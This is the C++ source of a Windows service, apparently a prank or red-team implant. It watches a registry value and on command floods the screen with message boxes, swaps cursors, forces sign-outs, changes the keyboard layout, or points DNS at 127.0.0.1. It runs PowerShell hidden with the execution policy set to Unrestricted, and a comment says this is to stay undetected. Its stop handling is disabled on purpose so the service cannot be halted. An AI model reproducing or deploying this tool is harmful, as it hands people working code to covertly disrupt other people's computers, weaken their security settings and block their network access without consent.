// Prom Event Loader.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
// Author : Jon Bauer (@JonBauer123)
// Description : This is the a Service that cannot be stopped or paused once started. It reads a registery
//				 key and determines which function. These functions include running powershell scripts,
//				 signning the user out, or messing with the cursor.
//
// Dependences : -Knowledge of where the scripts will be before hand.
//				 -Two cursor files placed with the other ones, named what is documented above the 
//				  glitchCursor function.

/*
	Current Registry Value to Control Flow : Computer\HKEY_CURRENT_USER\AppEvents\testvalue (DWORD)

	0x0000000 : The default waiting value
	0x0000001 : Message "Welcome to Prom!!!" as title and "Are you ready for a long day?" as message 100x.
	0x0000002 : Glitch the Cursor 
	0x0000003 : Return Cursor to default Cursor
	0x0000004 : Runs the RickBomb.ps1 script
	0x0000005 : Runs the script to change keyboard to dvorak
	0x0000006 : Runs the script to change keyboard to qwert
	0x0000007 : Runs the script to change Primary DNS server to 127.0.0.1 and flushes DNS cache
	0x0000008 : -
	0x0000009 : -
	0x0000010 : -

*/

#include "pch.h"
#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include <string>
#include <io.h>
//#include <process.h>
//#include <TlHelp32.h>

#pragma comment(lib, "advapi32.lib")

using namespace std;

// Defines Located Here
#define ServiceName L"Event Loader"
#define NUM_BOXES 100

// Globals Located Here
SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;
HANDLE ServiceStopEvent = NULL;

typedef DWORD (WINAPI* PtrWinStationSendMessage)(HANDLE, ULONG, LPCWSTR, ULONG, LPCWSTR, ULONG, ULONG, ULONG, PULONG, BOOLEAN);

/*
Function : messageSpam

Args :
	title : a LPCWSTR of what the title of the box will be
	text : a LPCWSTR of what the text in the box will be (NOTE: If string is too long then it will overflow
	numBoxes : the number of boxes that will be printed

Description :
	Will print out the specified number of boxes with a YES and NO. The message boxes have priority and will always say ontop
	of the screen.
*/
void messageSpam(LPCWSTR title, LPCWSTR text, int numBoxes) {

	// Gets the needed libraries
	auto hModule = LoadLibrary(L"C:\\Windows\\System32\\winsta.dll");
	PtrWinStationSendMessage WinStationSendMessageW = (PtrWinStationSendMessage)GetProcAddress(hModule, "WinStationSendMessageW");

	DWORD response;

	// Displays x boxes on the screen
	for (int i = 0; i < numBoxes; i++) {
		WinStationSendMessageW(
			NULL,
			1,
			title,
			wcslen(title) * 4 + 1,
			text,
			wcslen(text) * 4 + 1,
			MB_YESNO | MB_ICONQUESTION,
			0,
			&response,
			TRUE
		);
		Sleep(100);
	}
}

/*
Function : glitchCursor

Description :
	Opens the Cursor registry and sets all of them to a special cursor file.

REQUIREMENT/DEPENDENCE :
	Modified files in the Cursor directory @ C:\Windows\Cursors
		- aero_arrow_s.cur
		- aero_link_s.cur
*/
void glitchCursor() {

	HKEY reg = HKEY_CURRENT_USER;
	LPCWSTR regPath = L"Control Panel\\Cursors";
	HKEY hkey;

	wcout << "Attempting to open register: " << regPath << endl;

	long openCheck = RegOpenKeyEx(reg, regPath, 0, KEY_ALL_ACCESS, &hkey);

	if (openCheck != ERROR_SUCCESS) {
		wcout << "\tERROR: Could not open register " << regPath << endl;
		return;
	}

	cout << "\tRegister openned, changing values ...\n";

	LPCWSTR valuename = L"Arrow";
	wstring path = L"%SystemRoot%\\cursors\\aero_arrow_s.cur";
	long setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"Hand";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"Help";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"Wait";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"AppStarting";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"No";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"NWPen";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeAll";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeNESW";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeNS";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeNWSE";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeWE";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"UpArrow";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	RegCloseKey(hkey);

	system("shutdown -L");
}

/*
Function : defaultCursor

Description : 
	Opens the Cursor registry and sets all of them back to the default cursor values.
*/
void defaultCursor() {

	HKEY reg = HKEY_CURRENT_USER;
	LPCWSTR regPath = L"Control Panel\\Cursors";
	HKEY hkey;

	wcout << "Attempting to open register: " << regPath << endl;

	long openCheck = RegOpenKeyEx(reg, regPath, 0, KEY_ALL_ACCESS, &hkey);

	if (openCheck != ERROR_SUCCESS) {
		wcout << "\tERROR: Could not open register " << regPath << endl;
		return;
	}

	cout << "\tRegister openned, changing values ...\n";

	LPCWSTR valuename = L"Arrow";
	wstring path = L"%SystemRoot%\\cursors\\aero_arrow.cur";
	long setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Restored: " << valuename << endl;
	}

	valuename = L"Hand";
	path = L"%SystemRoot%\\cursors\\aero_link.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Restored: " << valuename << endl;
	}

	valuename = L"Help";
	path = L"%SystemRoot%\\cursors\\aero_helpsel.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Restored: " << valuename << endl;
	}

	valuename = L"Wait";
	path = L"%SystemRoot%\\cursors\\aero_busy.ani";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Restored: " << valuename << endl;
	}

	valuename = L"AppStarting";
	path = L"%SystemRoot%\\cursors\\aero_working.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Restored: " << valuename << endl;
	}

	valuename = L"No";
	path = L"%SystemRoot%\\cursors\\aero_unavail.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"NWPen";
	path = L"%SystemRoot%\\cursors\\aero_pen.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeAll";
	path = L"%SystemRoot%\\cursors\\aero_move.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeNESW";
	path = L"%SystemRoot%\\cursors\\aero_nesw.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeNS";
	path = L"%SystemRoot%\\cursors\\aero_ns.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeNWSE";
	path = L"%SystemRoot%\\cursors\\aero_nwse.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeWE";
	path = L"%SystemRoot%\\cursors\\aero_ew.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"UpArrow";
	path = L"%SystemRoot%\\cursors\\aero_up.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	RegCloseKey(hkey);

	system("shutdown -L");
}

/*
Function : callScript

Args :
	path : a string of the exact path of the script with the \\ format

Description :
	This function takes the scripts file path and runs it in a hidden window to help
	remain undetected as possible.
*/
void callScript(string path) {

	if (_access(path.c_str(), 0) == 0) {
		string run = "start powershell.exe -windowstyle hidden ";
		run.append(path);


		system("start powershell.exe -windowstyle hidden Set-ExecutionPolicy Unrestricted -Force \n");
		Sleep(1000);
		system(run.c_str());
	}
}

/*
Function : PopupThread

Description :
	This is the main thread for the service. It checks the registry key over and over again
	and if the value matches one of the specified values it will run the function that 
	matches the value.
*/
DWORD WINAPI PopupThread(LPVOID lpParameter) {

	// TODO : -Ensure all functions are run as expected
	//		  -Make sure deployment is smooth

	// Variables for opening and reading the keys
	HKEY hKey;
	DWORD buffer;
	LONG result;
	DWORD type = REG_DWORD, size = 1024;

	// This is the registry and key that is being checked
	HKEY reg = HKEY_CURRENT_USER;
	LPCWSTR regPath = L"AppEvents";
	LPCWSTR regRead = L"testvalue";

	DWORD resetValue = 0x00000000;

	// The service will infinitly start its checking here
	while (1) {
		result = RegOpenKeyEx(reg, regPath, 0, KEY_ALL_ACCESS, &hKey);
		if (result == ERROR_SUCCESS)
		{
			result = RegQueryValueEx(hKey, regRead, NULL, 0, (LPBYTE)&buffer, &size);
			if (result == ERROR_SUCCESS) {
				// TODO : Update this to a switch statment
				if (buffer == 0x00000001) {
					messageSpam(L"Welcome to Prom!!!", L"Are you ready for a long day?", NUM_BOXES);
				}
				else if (buffer == 0x00000002) {
					glitchCursor();
				}
				else if (buffer == 0x00000003) {
					defaultCursor();
				}
				else if (buffer == 0x00000004) {
					callScript("C:\\Users\\jon\\Documents\\PowershellScripts\\MemeScripts\\RickBomb.ps1");
				}
				else if (buffer == 0x00000005) {
					callScript("C:\\Users\\jon\\Documents\\PowershellScripts\\MemeScripts\\KeyboardChanger.ps1");
				}
				else if (buffer == 0x00000006) {
					callScript("C:\\Users\\jon\\Documents\\PowershellScripts\\MemeScripts\\KeybaordDefault.ps1");
				}
				else if (buffer == 0x00000007) {
					callScript("C:\\Users\\jon\\Documents\\PowershellScripts\\MemeScripts\\DNSChanger.ps1");
				}
			}
			RegSetValueEx(hKey, regRead, 0, REG_DWORD, (BYTE*)&resetValue, sizeof(resetValue));
			RegCloseKey(hKey);
		}
		Sleep(1000); // Waits to not overheat the processor
	}
	return 0;
}

// These functions are what starts and reports the service.

VOID ReportServiceStatus(DWORD CurrentState, DWORD Win32ExitCode, DWORD WaitHint) {

	static DWORD CheckPoint = 1;

	ServiceStatus.dwCurrentState = CurrentState;
	ServiceStatus.dwWin32ExitCode = Win32ExitCode;
	ServiceStatus.dwWaitHint = WaitHint;

	if (CurrentState == SERVICE_START_PENDING) {
		ServiceStatus.dwControlsAccepted = 0;
	}
	else {
		// Commenting this out stop the service from being stopped.
		//ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	}
	if ((CurrentState == SERVICE_RUNNING) ||
		(CurrentState == SERVICE_STOPPED))
		ServiceStatus.dwCheckPoint = 0;
	else ServiceStatus.dwCheckPoint = CheckPoint++;


	SetServiceStatus(ServiceStatusHandle, &ServiceStatus);

}

VOID WINAPI ServiceControlHandler(DWORD Control) {

	switch (Control)
	{
	case SERVICE_CONTROL_STOP:
		//ReportServiceStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
		//SetEvent(ServiceStopEvent);
		//ReportServiceStatus(ServiceStatus.dwCurrentState, NO_ERROR, 0);
		break; // Ensures that it cannot stop
	case SERVICE_CONTROL_INTERROGATE:
		break;

	default:
		break;
	}

}

VOID ServiceWorker(DWORD Argc, LPTSTR *Argv) {

	//we need to create an event that the svcctrlhhandler will use to signal when it recieves the stop code
	ServiceStopEvent = CreateEvent(
		NULL,
		TRUE,
		FALSE,
		NULL
	);

	if (ServiceStopEvent == NULL) {
		//ReportServiceStatus(SERVICE_STOPPED, NO_ERROR, 0);
		return;
	}

	ReportServiceStatus(SERVICE_RUNNING, NO_ERROR, 0);

	DWORD ThreadID;
	HANDLE myHandle = CreateThread(0, 0, PopupThread, NULL, 0, &ThreadID);

	while (1) {
		WaitForSingleObject(ServiceStopEvent, INFINITE);
		// Commenting this out stop the service from being stopped.
		//ReportServiceStatus(SERVICE_STOPPED, NO_ERROR, 0);
		return;
	}
}

VOID WINAPI ServiceMain(DWORD Argc, LPTSTR *Argv) {

	ServiceStatusHandle = RegisterServiceCtrlHandler(
		ServiceName,
		ServiceControlHandler
	);

	ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	ServiceStatus.dwServiceSpecificExitCode = 0;

	ReportServiceStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

	ServiceWorker(Argc, Argv);

}

int main()
{

	SERVICE_TABLE_ENTRY DispatchTable[] =
	{
		{(LPWSTR)ServiceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
		{NULL, NULL}
	};

	StartServiceCtrlDispatcher(DispatchTable);

}
